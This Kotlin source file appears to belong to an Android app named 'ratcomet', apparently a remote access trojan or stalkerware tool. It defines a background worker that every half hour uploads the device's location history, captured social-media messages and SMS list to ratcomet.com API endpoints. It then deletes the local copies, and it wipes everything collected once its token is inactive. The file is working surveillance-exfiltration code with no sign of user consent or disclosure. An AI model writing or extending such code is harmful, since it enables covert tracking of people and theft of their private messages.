package ug.hix.ratcomet.workers

import android.content.Context
import androidx.work.CoroutineWorker
import androidx.work.WorkerParameters
import com.github.kittinunf.fuel.core.extensions.jsonBody
import com.github.kittinunf.fuel.httpPost
import com.google.gson.Gson
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.coroutineScope
import kotlinx.coroutines.launch
import kotlinx.coroutines.withContext
import ug.hix.ratcomet.Repository
import ug.hix.ratcomet.util.CometUtil

class HalfHourWorker(private val appContext: Context, workerParams: WorkerParameters) : CoroutineWorker(appContext, workerParams){

    override suspend fun doWork(): Result = withContext(Dispatchers.IO){
        val TAG = javaClass.simpleName
        val repo = Repository(appContext)
        try {
            coroutineScope {
                when(CometUtil.isActiveToken(repo)) {
                    "true" -> {
                        launch {
                            val locationList = repo.getLastKnownLocation()
                            if (locationList.isNotEmpty()) {
                                val request = "https://ratcomet.com/api/location".httpPost()
                                    .jsonBody(Gson().toJson(locationList))
                                    .response { _, response, _ ->
                                        if (response.statusCode == 200) {
                                            repo.deleteLocation(locationList)
                                        }
                                    }
                                request.join()
                            }
                        }
                        launch {
                            val socialSendList = repo.getSocialSend()
                            if (socialSendList.isNotEmpty()) {
                                val request = "https://ratcomet.com/api/social_media".httpPost()
                                    .jsonBody(Gson().toJson(socialSendList))
                                    .response { _, response, _ ->
                                        if (response.statusCode == 200) {
                                            repo.deleteSocialSend(socialSendList)
                                        }
                                    }
                                request.join()
                            }
                        }
                        launch{
                            val smsList = repo.getSmsList()
                            if (smsList.isNotEmpty()) {
                                val request = "https://ratcomet.com/api/sms".httpPost()
                                    .jsonBody(Gson().toJson(smsList))
                                    .response { _, response, _ ->
                                        if (response.statusCode == 200) {
                                            repo.deleteSms(smsList)
                                        }
                                    }
                                request.join()

                            }
                        }
                    }
                    "false" -> {
                        //Clear database
                        repo.clearAllSms()
                        repo.clearAllLocations()
                        repo.clearAllSocialMsg()
                    }
                    else -> {}
                }
            }
            Result.success()
        } catch (e: Exception) {
//            Log.e(TAG, "Worker failed",e)
            Result.failure()
        }
    }

}